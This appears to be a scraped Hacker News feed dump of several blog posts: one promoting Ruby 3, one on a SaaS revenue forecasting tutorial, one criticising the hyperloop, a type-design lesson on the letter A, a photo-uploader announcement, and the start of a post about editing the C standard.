November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>
</div></div>]]>
            </description>
            <link>https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088015</guid>
            <pubDate>Fri, 13 Nov 2020 21:57:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS Revenue Forecasting]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25087894">thread link</a>) | @lhh
<br/>
November 13, 2020 | https://www.modeloptic.com/blog/saas-revenue-forecasting | <a href="https://web.archive.org/web/*/https://www.modeloptic.com/blog/saas-revenue-forecasting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!-- DESKTOP -->
      <p>
        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- MOBILE -->
      <p>
        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- DESKTOP -->
      

      <!-- MOBILE -->
      
      

      

      <div><p>
        There are many reasons you might want to create a financial forecast, most of which boil down to either 1) helping you manage the business and understand its dynamics better, or 2) telling the story of the company to others (whether the internal team, senior management, the board, investors, or prospective investors).
        </p><p>
        Here we’ll show you how to forecast revenue (and associated key metrics) for a subscription SaaS business.
        </p></div>

      <div><p>
        If you'd like to follow along in Excel, here's the file we'll be walking through (though you'll still be able to follow along without it):
        </p><a href="#" type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" rel="nofollow" onclick="download_file(event)">
          <p><i></i>Download the Example Model
          </p>
        </a>
      </div>



      

      <div><p>
        We’ll start first by forecasting our number of active subscribers. To do this, we forecast two key components: The number of new subscribers in a given month, and the number of canceled subscriptions (or “churn”).
        </p><p>
        To begin with a simple illustration, we’ll assume that we win 10 new subscribers per month. We’ll also assume that these subscriptions are cancellable any time, and that 10% of existing subscribers choose to cancel each month.
        </p><p>
        The beginning # of active subscribers in any period equals the ending number from the prior month. We refer to this method of forecasting as a “screw”.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-1.png"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-1.png" data-enlargeable=""></p><p>
              <span>
                A basic subscriber forecast.
              </span>
            </p>
        </div>
      </div>

      <p>
        As a quick aside, there are many other ways to go about forecasting churn, like analyzing cohort behavior over time, to potentially get to a more accurate projection. Our view is that it’s only worth getting into that level of detail once the company has reached a certain level of maturity, likely in the range of several thousand subscribers. Before then though, the simpler monthly churn rate is the approach we most often recommend because it’s easier to calculate, easier to forecast, and it prevents you from getting bogged down in unnecessary detail and drawing conclusions from too sparse of data.
        </p>

      

       <div>
        <!-- <br /><br /> --><p>
        So now we have a simple framework for forecasting our number of active subscribers for any period. Next we add in our assumption on revenue per month, and multiply that by our # of active subscribers to get total revenue per month.
        </p><p>
        We'll add in a calculation for ARR (Annual Recurring Revenue) here as well by simply multiplying monthly revenue by 12.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-2.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-2.png" data-enlargeable=""></p><p>
              <span>
                Monthly Subscription Revenue = [ Ending # of Active Subscribers ] * [ Avg Revenue / Subscriber ]
              </span>
            </p>
        </div>
      </div>

      <p>
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. 
        </p>

      

      <div>
        <!-- <br /><br />
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say that charge is $5k.
        <br /><br /> --><p>
        Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say we charge $5k. You can see that logic added in below, and we've also totaled up these two revenue lines (Subscription Revenue and Implementation Revenue) to get Total Revenue. 
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-3.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-3.png" data-enlargeable=""></p><p>
              <span>
                Note that our ARR calculation here does not include the new non-recurring services revenue.
              </span>
            </p>
        </div>
      </div>

      

      <div>
        <!-- <br /><br /> --><p>
        We could also get a bit more sophisticated about how we forecast our number of new customers each month instead of simply hard-coding our new customer count at 10 per month. Let’s say our primary customer acquisition method is converting visitors from our website. For any set of website visitors, some of them contact us to become a lead, and then some of those leads convert into paying customers.
        </p><p>
        For starting baseline assumptions, let's say we get 1,000 website visitors per month, 2% of those convert into leads, 20% of our leads convert into paying customers, and our marketing efforts drive an increase in website visitors by 1,000 per month.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-4.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-4.png" data-enlargeable=""></p><p>
              <span>
                A slightly more sophisticated sales funnel forecast.
              </span>
            </p>
        </div>
      </div>

      <!-- <div class="col-12 col-md-6 offset-md-3 blog-section-content">
        <br /><br />
        You could then go further to calculate direct costs to get to gross profit, calculate customer LTV, tie new website visitors to marketing spend and new customers to sales spend to calculate CAC, and so on, but we’ll save those steps for future articles.
      </div> -->

      <!-- <div class="col-12 col-md-6 offset-md-3 blog-section-header">
        <h2>Conclusion</h2>
      </div> -->

      

      <div>
        <!-- <br /><br /> --><p>
        We could then go further to calculate direct costs to get to gross profit, calculate customer LTV, tie new website visitors to marketing spend, and so on, but we’ll save those steps for future articles.
        </p><!-- <span style="font-style: italic;">
          Want to be more sophisticated about forecasting? We're the makers of <a href="/">Modeloptic</a>, a powerful and intuitive financial reporting & projections platform. I'd love to hear from you at <a href="mailto:luke.harris@modeloptic.com">luke.harris@modeloptic.com</a>.
        </span> -->
      </div>


      

      <p>
        <span>
          Want to be more sophisticated about your forecasting? We're the makers of <a href="https://www.modeloptic.com/">Modeloptic</a>, a powerful and intuitive financial reporting &amp; projections platform. We'd love to hear from you at <a href="mailto:contact@modeloptic.com">contact@modeloptic.com</a>.
        </span></p>

    </div></div>]]>
            </description>
            <link>https://www.modeloptic.com/blog/saas-revenue-forecasting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25087894</guid>
            <pubDate>Fri, 13 Nov 2020 21:47:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hyperloop’s Only Destination Is a Capitalist Hellscape]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 79 (<a href="https://news.ycombinator.com/item?id=25087782">thread link</a>) | @xdze2
<br/>
November 13, 2020 | https://discourseblog.com/hyperloop-test-virgin-scam/ | <a href="https://web.archive.org/web/*/https://discourseblog.com/hyperloop-test-virgin-scam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Back in 2016 and 2017, one of the key components of mainstream tech coverage was something referred to as “vaporware“1: flashy, futuristic tech whose supposed potential often overshadowed its practicality or even, you know, actual existence in the real world. </p>



<p>This was a strange time in technology and tech journalism, one <a href="https://discourseblog.com/elon-musk-made-me-a-socialist/">I’ve written about at length before</a>. Uber did a whole <a href="https://www.theverge.com/2017/11/8/16613228/uber-flying-car-la-nasa-space-act">summit on how it was going to build flying cars,</a> self-driving technology was assumed to be right around the corner, and editors commissioned endless stories about <a href="https://www.mercurynews.com/2016/07/09/hacking-the-brain-silicon-valley-entrepreneurs-turn-to-fasting-and-smart-drugs/">“biohacking”</a> and <a href="https://www.bbc.com/news/technology-34210012">“transhumanism.”</a> One of the most interesting, most hyped, and most wildly impractical technologies from this era was the hyperloop. </p>



<p>I’m not going to go into huge detail on the hyperloop’s origin story, other than to say it owes its current popularity to the incredibly stupid personality cult surrounding Elon Musk. The technology is relatively easy to understand: you put a vehicle on a track inside a vacuum-sealed tube and it goes very fast. </p>



<p>The hilariously named Virgin Hyperloop2 passed a huge milestone this week when its first two passengers went down its 500-meter tube at a little over 100mph.3 The company celebrated the achievement by releasing a modest video comparing it to, among other things, the moment the Wright Brothers flew the first planes.</p>



<figure></figure>



<p>The core difference of the “hyperloop” versus, say, a train, is that the passenger-carrying vehicle inside the vacuum tube is not susceptible to air resistance, and can therefore attain speeds that are largely impossible or unsafe for an external train. However, as you can imagine, the logistics of building a perfectly vacuum-sealed tube big enough to carry a magnetic levitation vehicle are significantly more difficult than, say, building a train track (even a magnetic levitation one). </p>



<p>And as <a href="https://twitter.com/leftistthot420/status/1326559165838487552?s=20">many</a> <a href="https://twitter.com/hilaryagro/status/1326531535223345153?s=20">people</a> <a href="https://twitter.com/jkass99/status/1326607439240679424?s=20">pointed out</a> online, focusing on this kind of technology rather than, say, <em>trains</em>, is insanely stupid because we already have trains that are way better than this. We—by which I mean America— just don’t want to spend the money to build them. </p>



<figure></figure>



<p>Hyperloop is, in this context, the perfect example of the end-state death-cult capitalism that the American ruling class believes in. Virgin Hyperloop has raised some $400 million so far according to the <a href="https://www.nytimes.com/2020/11/08/business/virgin-hyperloop-passenger-test.html"><em>New York Times</em> story on the test</a>, which is half just a press release and then two interviews with experts saying “this shit won’t work, why are they doing this.” $400 million is a drop in the bucket compared to what it would cost to build an actual functioning high-speed rail network across the country.4</p>



<p>What hyperloop <em>does</em> do, however, is let the powers that be point to flashy efforts to make a cool technology real, like when Trump’s Transportation Secretary Elaine Chao5 <a href="https://www.mhlnews.com/transportation-distribution/article/22055573/dot-wants-to-weigh-in-on-emerging-transportation-technology">created</a> the Non-Traditional and Emerging Transportation Technology (NETT) Council to basically remove any federal regulation that would stop people flooding money into this shit.</p>



<p>Despite how all this sounds, I’m ultimately not a pessimist on the hyperloop as a whole. I think that worldwide mass transit is eventually going to need some kind of system that replaces air travel, which is extraordinarily energy-inefficient and currently relies entirely on fossil fuels to make it work. Ground transportation is largely restricted in speed by friction and air resistance, two things that a vacuum-sealed hyperloop system removes.6 I think eventually, a global network of 500 mph + transport technology might be feasible, but this is like 2200 tech we’re talking about, not 2020. Until then, we have trains. Trains that work, trains that can work even better, trains that are <em>incredibly efficient at moving goods, services, and people long distances and are relatively easy to power with non-fossil-fuel sources because they’re on static tracks. </em>Trains are good! </p>



<p>But this is America, and we cannot have nice things. Creating a nationwide high-speed rail service would cost money and political capital, and doing it right would require it to be a largely publicly-funded and administered project. Hyperloop, however, is marketing itself to the highest bidder: there’s a reason that the first contracts its various scammy companies sold were to do things like <a href="https://www.bbc.com/news/technology-49096675">connecting Riyadh to Jeddah in Saudi Arabia</a>.  </p>



<p>The core deceit of all of these technologies, from hyperloop to flying cars to neural nets, is that they will demonstrably improve everyday people’s lives at some point in their lifetimes. What the founders do is say “this is coming in 2020,” in 2016, and by 2020 they’re a bit behind schedule, but look, they have a flashy test to show you. The technology is coming soon, they promise. And when it gets here, when they “make it a reality,” to paraphrase almost every article written about vaporware, your life will get better. Only the tech never comes. And when it does, you won’t be able to afford it. It’s entirely possible that in our lifetimes the oil and gas billionaires in Saudi Arabia will be able to shoot themselves in tiny designer-branded pods with heated leather seats from one side of the Kingdom to the other. Maybe we’ll even have a line in the U.S. that Wall Street execs and DC lobbyists will use to blast up and down the Eastern Seaboard for business lunches. But you and me? We’ll be stuck on dilapidated Amtrak lines, no matter how many press tours Joe Biden takes on them, eating Cup Noodles from the dining car, or else stuck in our cars, choking the sky with emissions from the gas that we can barely afford to buy, stuck in traffic on roads falling further and further into disrepair, our only consolation the fact that the hyperloop’s vacuum-sealed tubes don’t have windows, so its riders won’t be able to gawk or gloat as they fly by at 800 miles per hour. </p>



<hr>



<ol><li><em>For an absolutely excellent breakdown of what vaporware and tech like it is, watch <a href="https://www.youtube.com/watch?v=4dn6ZVpJLxs">engineering YouTuber donoteat01’s video on a related idea</a>, Elon Musk’s “Loop” system. He uses the term “Fucking Magic,” rather than vaporware, which is more fun to say honestly. </em></li><li><em>As an aside, Virgin Hyperloop is the like fifth corporate incarnation of a company called Hyperloop One that was founded by a bunch of tech dorks including a man named, I shit you not, Brogan BamBrogan, who later left the company to start his own hyperloop company because his co-founders allegedly put an alleged noose on his desk during some kind of internal conflict that I refuse to re-familiarize myself with but that you can read about here in a <a href="https://www.inverse.com/article/18194-the-8-wildest-takeaways-from-bambrogan-s-hyperloop-one-lawsuit">listicle that I edited in 2016</a>.</em></li><li><em>Guess they can’t call it a virgin anymore ha ha ha ha. </em></li><li><em>Probably in the hundreds of billions if not trillions I honestly have no idea but it’s not cheap. Seth Moulton put forth <a href="https://www.globalrailwayreview.com/news/100907/plans-investment-us-high-speed-rail/">a $240 billion plan</a> a few years ago but I think that’s a little low. </em></li><li><em>Chao is also Mitch McConnell’s wife. </em></li><li><em>People actually figured this out in the 1800s when they used <a href="https://www.newstatesman.com/future-proof/2013/12/londons-victorian-hyperloop-forgotten-pneumatic-railway-beneath-capitals-street">pneumatic tubes to shoot mail and cargo all over London.</a> </em></li></ol>
</div></div></div></div></div>]]>
            </description>
            <link>https://discourseblog.com/hyperloop-test-virgin-scam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25087782</guid>
            <pubDate>Fri, 13 Nov 2020 21:35:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ohno Type School]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25087235">thread link</a>) | @tobr
<br/>
November 13, 2020 | https://ohnotype.co/blog/ohno-type-school-a | <a href="https://web.archive.org/web/*/https://ohnotype.co/blog/ohno-type-school-a">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <div>
                            <div data-slide-ratio="0.625">
                    <div>
                        
<div>
    

    <p><img src="https://ohnotype.co/type-school/A/01.svg" alt="01">
</p></div>
                    </div>

                                            <div>
                            <p>You might expect the crossbar on <strong>A</strong> to hit exactly at the center, but nah…</p>
                        </div>
                                    </div>
                            <div data-slide-ratio="0.625">
                    <div>
                        
<div>
    

    <p><img src="https://ohnotype.co/type-school/A/02.svg" alt="02">
</p></div>
                    </div>

                                            <div>
                            <div>
                                <p>That leaves <strong>A</strong> feeling really high-waisted, and ugly AF.</p>
<p>What we want is a balance between the top and bottom negative spaces.</p>
                            </div>
                        </div>
                                    </div>
                            <div data-slide-ratio="0.625">
                    <div>
                        
<div>
    

    <p><img src="https://ohnotype.co/type-school/A/03.svg" alt="03">
</p></div>
                    </div>

                                            <div>
                            <p>Call it water, air, sand, crushed hopes and dreams, whatever! The important thing is that those two negative spaces are close to each other in size.</p>
                        </div>
                                    </div>
                            <div data-slide-ratio="0.625">
                    <div>
                        
<div>
    

    <p><img src="https://ohnotype.co/type-school/A/04.svg" alt="04">
</p></div>
                    </div>

                                            <div>
                            <p>Another failure of geometry is the stroke weight where joints occur.</p>
                        </div>
                                    </div>
                            <div data-slide-ratio="0.625">
                    <div>
                        
<div>
    

    <p><img src="https://ohnotype.co/type-school/A/05.svg" alt="05">
</p></div>
                    </div>

                                            <div>
                            <p>Completely even stroke weight would give us a joint that appears way too heavy!</p>
                        </div>
                                    </div>
                            <div data-slide-ratio="0.625">
                    <div>
                        
<div>
    

    <p><img src="https://ohnotype.co/type-school/A/06.svg" alt="06">
</p></div>
                    </div>

                                            <div>
                            <p>I can get carried away with this, but you don’t have to be so dramatic. Important: joints should thin out a bit, and they don’t define your contrast.</p>
                        </div>
                                    </div>
                    </div>
    </div>
</div></div>]]>
            </description>
            <link>https://ohnotype.co/blog/ohno-type-school-a</link>
            <guid isPermaLink="false">hacker-news-small-sites-25087235</guid>
            <pubDate>Fri, 13 Nov 2020 20:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Put your action camera photos and videos “on the map”]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25087046">thread link</a>) | @panoramas4good
<br/>
November 13, 2020 | https://www.trekview.org/blog/2020/map-the-paths-desktop-uploader/ | <a href="https://web.archive.org/web/*/https://www.trekview.org/blog/2020/map-the-paths-desktop-uploader/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p><strong>Put your images and video “on the map”</strong></p>

<p><a href="https://www.trekview.org/blog/2019/diy-google-street-view-part-5-uploading-photos-using-your-computer">A little over a year ago now I wrote about a small piece of software, Tourer</a>, that allowed you to upload images from your action cameras to Google Street View and other panoramic image hosting sites.</p>

<p><img src="https://www.trekview.org/assets/images/blog/2020-11-13/map-the-paths-uploader-sm.jpg" alt="Map the Paths Desktop Uploader" title="Map the Paths Desktop Uploader"></p>

<p>Admittedly, slightly later than planned, here is a much more friendly version; the Map the Paths Desktop Uploader.</p>

<p>If you have created photos and videos using a 2D or 360 action camera, that are GPS tagged, you can now bring them to life outside of YouTube and Facebook.</p>

<p><img src="https://www.trekview.org/assets/images/blog/2020-11-13/map-the-paths-uploader-modify.jpg" alt="Map the Paths Desktop Uploader" title="Map the Paths Desktop Uploader"></p>

<p>Perhaps you have footage you’ve already shared on YouTube:</p>

<ul>
  <li>Skiing a clean line of powder</li>
  <li>Descending a tree-lined downhill MTB trail</li>
  <li>Surfing an epic wave</li>
  <li>[Insert action sport here]</li>
</ul>

<p><img src="https://www.trekview.org/assets/images/blog/2020-11-13/map-the-paths-uploader-viewer.jpg" alt="Map the Paths Desktop Uploader" title="Map the Paths Desktop Uploader"></p>

<p>Now you can share it with others in map form, so that they cannot only relive your awe inspiring lines, but also help them plan their route by committing your adventures as lines to the map.</p>

<p>All you need is the footage and the Map the Paths Uploader will do the rest.</p>

<p><img src="https://www.trekview.org/assets/images/blog/2020-11-13/map-the-paths-uploader-integrations.jpg" alt="Map the Paths Desktop Uploader" title="Map the Paths Desktop Uploader"></p>

<p>Here’s what it can currently do:</p>

<ul>
  <li>Add metadata to Sequences for easy management and discovery (name, description, tags)</li>
  <li>Add metadata to photos (copyright, artist name…)</li>
  <li>Convert video to photo frames</li>
  <li>Geotag photo files using a .gpx track</li>
  <li>Modify the GPS track of the photos including;
    <ul>
      <li>Define photo spacing</li>
      <li>Modify position</li>
      <li>Modify heading</li>
      <li>Remove unwanted photos</li>
    </ul>
  </li>
  <li>Upload and add a nadir to photos</li>
  <li>Blur people and license plates</li>
  <li>Upload to web platforms
    <ul>
      <li>Map the Paths Web</li>
      <li>Mapillary</li>
      <li>Google Street View</li>
      <li>Strava (<code>.gpx</code> track)</li>
      <li>Developer? <a href="https://guides.trekview.org/mtp-desktop-uploader/developer-docs/integrations">Add your own…</a></li>
    </ul>
  </li>
</ul>

<p><a href="https://mtp.trekview.org/uploader">You can download the latest version of the Desktop Uploader (always FREE) on Map the Paths here</a>.</p>


		

		<h3>Map the Paths</h3>



		<hr>

		

		

		
	</div></div>]]>
            </description>
            <link>https://www.trekview.org/blog/2020/map-the-paths-desktop-uploader/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25087046</guid>
            <pubDate>Fri, 13 Nov 2020 20:26:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Editing the C Standard]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25086673">thread link</a>) | @trollied
<br/>
November 13, 2020 | https://thephd.github.io/editing-the-c-standard | <a href="https://web.archive.org/web/*/https://thephd.github.io/editing-the-c-standard">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
      <p>… I did it. I survived the Paper Blitz.<!--more--></p>



<p>For those of you who saw one of my earlier posts about <a href="https://thephd.github.io/your-c-compiler-and-standard-library-will-not-help-you">why most C implementations will purposefully blow your leg off even in the simplest of scenarios</a>, you may have noticed that I said I became the Project Editor for C. That’s a fancy way of saying I glue the standard together and produce both the Working Drafts/Working Papers (WDs/WPs), an Editor’s Report, and a Diffmark of the WD against the last published WD.</p>

<p>The <a href="https://drive.google.com/file/d/1IbngZ8StYVVYASd3WWuC4Uu9Xs39AF_N/view?usp=sharing">Working Draft is here</a> and the <a href="https://drive.google.com/file/d/1x4-eIBbQU3aXuORoNPSixbbl_ZKKfWfu/view?usp=sharing">Diffmarks are here</a> until I can publish it O f f i c i a l l y through the ISO® N-Paper™ System©.</p>

<p>Silly symbols aside, this was a slog through 30+ papers, a few defect reports, several editorial issues, and a minor cleanup of some of the sources. There was a backlog of about 3 meetings worth of papers to integrate, give or take a few from a few missed integrations in the past and a few things early-integrated from the meetings I had to cover. Despite some pretty crazy shenanigans when I was first handling becoming the Project Editor, everything ended up turning out smoothly! For the most part, anyways: I can already smell the editorial reports for all the things I probably messed up integrating. But what is it like, editing a Standards Document? What’s it like taking all those documents and turning them into a Working Draft?</p>

<p><img src="https://thephd.github.io/assets/img/2020-09-11/papers.png" alt="Image of a few of the papers from "></p>



<p>As with any project, it needs tools. This standard is built with a suite of tools any *Nix programmer will find comforting:</p>

<ul>
  <li><code>make</code>, for general build purposes</li>
  <li><code>sed</code> and <code>awk</code> for some reserved identifier / keyword shenanigans</li>
  <li><code>latex</code>, with the usual <code>pdflatex</code> and other shenanigans</li>
  <li><code>git</code>, to pull a previously tagged version of the standard to attempt to create useful diffmarks</li>
</ul>

<p>There’s also a bunch of other side tools used to generate some docs and other things, but that’s the core of it! As usual, nothing that discusses LaTeX would be complete without me saying the following…</p>

<h3 id="latex-is-horseshit">LaTeX is horseshit</h3>

<p>Boooiiiiiiiiiiii, do I hate LaTeX. The available LaTeX distributions are piss-tier garbage, printing a line number but not tracking any file information which makes any stream of multi-compilation completely useless and requiring separate invocations of the latex compiler for each file and magic to know which file you’re in. Not that that is how most people organize documents: <code>\input{the_file}</code> is the choice of developing a modular document in LaTeX land, complete with <code>#include</code>-like behavior but with 0% of the compiler Quality of Implementation.</p>

<p>Changing one thing of course results in a cascade of errors, warnings are split over multiple lines so as to make most error-parsing and warning-parsing regexen useless for trying to pick errors out of the literal 1 MB dump of errors, and trying to edit anything beyond the most basic of syntax is a complete slog. There is no reasonability, particular form, or dependable structure to LaTeX errors, other than “hard errors” starting with <code>!</code>.</p>

<p>Whitespace is not significant in the language (except when it is), people slap ad-hoc commands together to patch over LaTeX’s gross inefficiencies, adding that footnote catapults the next 3 paragraphs of text to write into the margins to the right, and have you heard of our Lord and Savior <code>OVERFULL HBOX</code>?</p>

<p>My eternal advice to everyone is to stop writing documents in LaTeX, please. You’d get farther and faster in even Microsoft Word, and it would render better for the internet. It has math support and it doesn’t poo all over the bed and scream when you want to try to add a mild margin to your author and title names, gargling with cryptic hints as to what will satisfy it enough to stop besmearing the nice linens in its dreadful output.</p>

<p>If your hands shake at the thought of not using BEAUTIFUL, LAYOUT-POWERFUL, HAND-BAKED LATEX on your résumé, there’s templates that make your Word Documents look like LaTeX ones. Just using a different Serif-y font will probably go a long way towards that look!</p>

<p>… That being said, the C Standard is written in LaTeX, so that’s what we’re editing.</p>

<h3 id="the-c-standard-is-mostly-nice">The C Standard is Mostly Nice</h3>

<p>Don’t get me wrong: LaTeX is garbage, but the Standard I was handed is of pretty good quality for a LaTeX document. It was easy to build and edit, I did not get lost once I had all the proper things installed (I did not decide to try to figure out the “minimum required distribution” and instead just shotgun <code>apt get install</code>d <code>texlive-full</code>), and the files were orderly. Referencing things is kind of terrible but that’s more of a LaTeX problem than a structure problem. I am also lucky to even be getting a LaTeX document: the standard used to be written in some God Awful Rotten Badness by the name of “TROFF”. I don’t know too much about it, and from the little that I did learn</p>

<p>I plan to keep it that way. 😄</p>

<p>There’s also the use of <code>latexdiff</code> and other things to produce nice diffmarks. It works out pretty decently, some of the marks are incredibly noisy. Still: as long as it highlights the general area of changes, it produces a pretty good proxy of “places to look for things that have changed”. It does ignore newly added files, which is why the lists at the beginning of the Working Paper – which detail the list of documents added from each meeting – are not all blue-highlighted. Having a nice LaTeX document with some really nice organization left to me by the last editor made the next part of this article the easiest…</p>



